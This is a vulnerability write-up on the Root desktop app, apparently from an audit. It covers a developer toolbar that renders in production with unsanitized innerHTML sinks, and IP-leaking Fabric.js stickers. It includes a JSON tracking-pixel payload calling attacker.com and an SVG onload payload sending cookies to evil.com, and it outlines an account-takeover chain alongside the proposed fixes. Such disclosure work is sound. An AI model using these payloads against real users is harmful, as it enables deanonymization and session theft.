# DevBar Renders in Production & Stickerwall IP Exfiltration

Two findings that individually look like low-severity oversights but chain together into something much worse.

---

## 1. DevBar Is Live in Production Root.exe

### The Check

Every sub-app bundle gates DevBar registration on a user-agent string:

```javascript
navigator.userAgent.toLowerCase().indexOf("rootsdk") < 0
    && customElements.define("rootsdk-devbar", DevBarComponent)
```

Translation: if the user-agent does NOT contain "rootsdk", register DevBar as a custom HTML element and render it.

### The Problem

Root.exe never sets "rootsdk" in the user-agent.

DotNetBrowser's Chromium uses a standard Chrome UA:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ... Chrome/144.0.7559.60 ...
```

No "rootsdk" anywhere. The DotNetBrowser API to set a custom UA exists in the binary (`setuseragentwithmetadatarequest` at offset 0x0D4A3203), but Root.exe never calls it with "rootsdk".

### The Evidence

Binary scan of Root.exe (617MB) for "rootsdk":
- **77 hits** — every single one is a CSS variable name (`--rootsdk-brand-primary`, `--rootsdk-background-secondary`, etc.)
- **Zero** hits for "rootsdk" as a standalone string, UA config, or API parameter

The condition `indexOf("rootsdk") < 0` evaluates to **TRUE** in production. DevBar registers. DevBar renders.

### What's Ironic

The WebRTC bundle has a separate mock bridge gate that checks for a *different* string:

```javascript
toLowerCase().indexOf("rootplatform") >= 0
```

Two different teams wrote two different checks. Neither string is set in the production user-agent. The WebRTC mock bridge is also ungated (though its hardcoded token is expired, so it's less dangerous).

### What DevBar Exposes

DevBar is a full development toolbar that renders as a fixed bar across the top of every sub-app:

```css
.devbar {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 48px;
    background: #1a1a2e;
    z-index: 999999;
}
```

It contains:
- **User selector** — dropdown to switch identity (calls `devGetUsers()`)
- **Role editor** — add/remove community roles on users (`devUserAddRole`, `devUserRemoveRole`)
- **Theme switcher** — switch between light/dark/pure-dark themes
- **Bridge testing** — direct access to the SDK object

The dev bridge HTTP endpoints (ports 8080-8082) are closed in production, so most DevBar functions fail silently when clicked. But the component itself renders, the innerHTML sinks are live, and the custom element is registered and available to JavaScript.

### The innerHTML Sinks (H3)

DevBar renders user data via innerHTML with zero sanitization. Five confirmed injection points:

```javascript
// Sink 1: User nickname + ID in dropdown (line ~35249)
button.innerHTML = `<div>${user.nickname}</div><div class="user-id">${user.id}</div>`;

// Sink 2: Selected user nickname (line ~35170)
this.#userButton.innerHTML = `<span>${currentUser?.nickname || "Select User"}</span>...`;

// Sink 3: Alternate nickname render (line ~35244)
this.#userButton.innerHTML = `<span>${currentUser?.nickname || "Select User"}</span>...`;

// Sink 4: Community role names (line ~35261)
label.innerHTML = `<input type="checkbox" ...><span>${role.name}</span>`;

// Sink 5: Theme name with attribute injection (line ~35269)
label.innerHTML = `<input type="radio" name="theme" value="${themeName}" ...><span>${themeName}</span>`;
```

In production, `devGetUsers()` fails (port closed), so sinks 1-3 don't populate with attacker data under normal conditions. But the DOM elements exist, the component is registered, and any JavaScript that can call DevBar methods or set its properties can trigger the innerHTML paths.

### Affected Apps

DevBar ships in **5 of 7** sub-apps:

| App | Has DevBar |
|-----|-----------|
| Raid Planner | Yes |
| Task Tracker | Yes |
| Polls | Yes |
| Suggestions | Yes |
| Minecraft | Yes |
| Stickerwall | No |
| Hexatris | No |

All 7 apps register the custom element, but only 5 instantiate the `<rootsdk-devbar>` tag in their DOM.

---

## 2. Stickerwall IP Exfiltration via Fabric.js

### How Stickers Work

Stickerwall lets users create and share stickers containing images, text, shapes, and drawings. The sticker content is serialized as a Fabric.js canvas JSON object, gzip-compressed, base64-encoded, and stored server-side. When any user views a sticker, the client:

1. Receives the `canvas_json` field from the server
2. Decompresses if gzip-prefixed (raw JSON also accepted)
3. Calls `fabric.Canvas.loadFromJSON(canvasData)` to deserialize
4. Fabric.js creates objects from the JSON, including `Image` objects
5. For each Image, Fabric.js sets `img.src = json.src` — fetching whatever URL is in the data

### The Vulnerability

There is **zero validation** on the `canvas_json` content. No schema check, no URL allowlist, no sanitization library. The Stickerwall bundle contains:

- **Zero** instances of DOMPurify
- **Zero** instances of sanitize-html
- **Zero** URL scheme checks on Image src fields

The Image loading code:

```javascript
// Fabric.js Image.fromObject — deserializes from JSON
// src field is used directly:
xlink:href="${this.getSvgSrc(true)}"

// getSvgSrc() returns:
// - element.getAttribute('src') (srcFromAttribute mode)
// - element.src (direct property)
// - this.src (raw from JSON)
// NO validation on any path
```

### The Attack

An attacker creates a sticker with a crafted `canvas_json`:

```json
{
  "objects": [
    {
      "type": "Image",
      "src": "https://attacker.com/beacon.png?uid=TARGET_COMMUNITY",
      "width": 1,
      "height": 1,
      "opacity": 0
    }
  ]
}
```

The image is 1x1 pixel, fully transparent. Invisible to the viewer. When ANY user in the community views or previews this sticker, their browser silently fetches `https://attacker.com/beacon.png`. The attacker's server logs:

```
GET /beacon.png?uid=TARGET_COMMUNITY
Remote-Addr: 203.0.113.47        ← victim's real IP
User-Agent: Chrome/144.0.7559.60 ← DotNetBrowser fingerprint
Referer: [Root app URL]
```

### What the Attacker Gets

| Data | How |
|------|-----|
| **Victim's IP address** | HTTP request to attacker server |
| **DotNetBrowser fingerprint** | User-Agent header identifies Root app users specifically |
| **Timing** | When the victim is online and viewing stickers |
| **Community membership** | Confirms which users are in which communities |

### Broadcast to All Users

Stickers are shared via `broadcastLightweightPlacement`, which pushes sticker data to ALL connected users in real-time. A single malicious sticker creation hits every online community member who has Stickerwall open.

### Scale

The Root community has **16,971 members** (confirmed via M29 member list dump). A single sticker with a tracking pixel exfiltrates every viewer's IP.

### Beyond IP: The SVG Question

The more dangerous question is whether the Fabric.js SVG output path enables script execution. When Fabric.js renders to SVG (via `toSVG()`), Image objects become:

```xml
<image xlink:href="[ATTACKER_CONTROLLED_SRC]" x="0" y="0" width="100" height="100" />
```

The `xlink:href` value comes directly from the JSON `src` field. If this SVG is inserted into the DOM (which Fabric.js does for rendering), and if the src is a `data:` URI containing an SVG with an `onload` handler:

```json
{
  "type": "Image",
  "src": "data:image/svg+xml,<svg onload='fetch(\"https://evil.com/steal?t=\"+document.cookie)'>"
}
```

Whether this executes depends on:
- How DotNetBrowser handles SVG-in-image with `--disable-web-security`
- Whether Fabric.js uses `<img>` tags (which sandbox SVG) or `<image>` in inline SVG (which may not)
- Whether the Chromium instance respects standard SVG script sandboxing with web security disabled

This is unconfirmed without live testing. Standard Chrome blocks script execution in SVG loaded as images. But DotNetBrowser's `--disable-web-security` flag relaxes cross-origin restrictions, and the interaction with SVG sandboxing is not documented.

---

## How They Chain Together

### Scenario: Mass IP Harvesting

```
1. Attacker joins community with Stickerwall enabled
2. Creates sticker with invisible tracking pixel
3. All 16,971 members who open Stickerwall have their IP logged
4. Attacker correlates IPs with user UUIDs from member list dump (M29)
5. Result: deanonymization of every community member
```

### Scenario: Targeted Surveillance

```
1. Attacker creates sticker with unique URL per target
2. Shares via broadcastLightweightPlacement
3. Logs which specific users are online and when
4. Builds activity profile over time
```

### Scenario: If SVG Execution Works (Unconfirmed)

```
1. Attacker creates sticker with SVG payload in canvas_json
2. Victim views sticker → loadFromJSON → SVG rendered in DOM
3. SVG onload fires → JavaScript executes in app context
4. JS calls window.__rootSdkBridgeWebToNative.restart("javascript:...")  [C5]
5. Reads Bearer token from memory
6. Exfiltrates to attacker server
7. Calls RefreshToken → victim locked out  [M26]
8. Full account takeover from viewing a sticker
```

This last scenario — account takeover from viewing a sticker — is **one live test away from confirmed**. Every piece of the chain is present in the code. The only open question is whether `--disable-web-security` breaks SVG script sandboxing.

---

## Root Causes

| Issue | Root Cause |
|-------|-----------|
| DevBar in production | User-agent check looks for "rootsdk" but Root.exe never sets it |
| innerHTML XSS in DevBar | Template literals with `${user.nickname}` instead of `textContent` |
| Stickerwall IP leak | `loadFromJSON()` with zero validation on Image src URLs |
| No sanitization | Zero DOMPurify, zero escapeXml, zero URL allowlist in Stickerwall |
| Broadcast amplification | Stickers pushed to ALL connected users, maximizing victim count |

## Fixes

**DevBar**: Either set "rootsdk" in the DotNetBrowser user-agent via `SetUserAgentWithMetadataRequest`, or (better) strip DevBar from production builds entirely. The code, the CSS, the innerHTML sinks — all of it should be removed by the build system.

**Stickerwall**: Validate `canvas_json` before passing to `loadFromJSON()`. At minimum:
- Allowlist object types (`Rect`, `Circle`, `Text`, `Path` — not `Image`)
- If Image is needed, allowlist URL schemes (`https://` only) and domains
- Add DOMPurify for any SVG output
- Strip event handler properties from deserialized objects

**Both**: Add a Content Security Policy. `script-src 'self'` blocks `javascript:` URIs, `data:` execution, and inline event handlers — neutralizing the C5 chain even if XSS gets through.
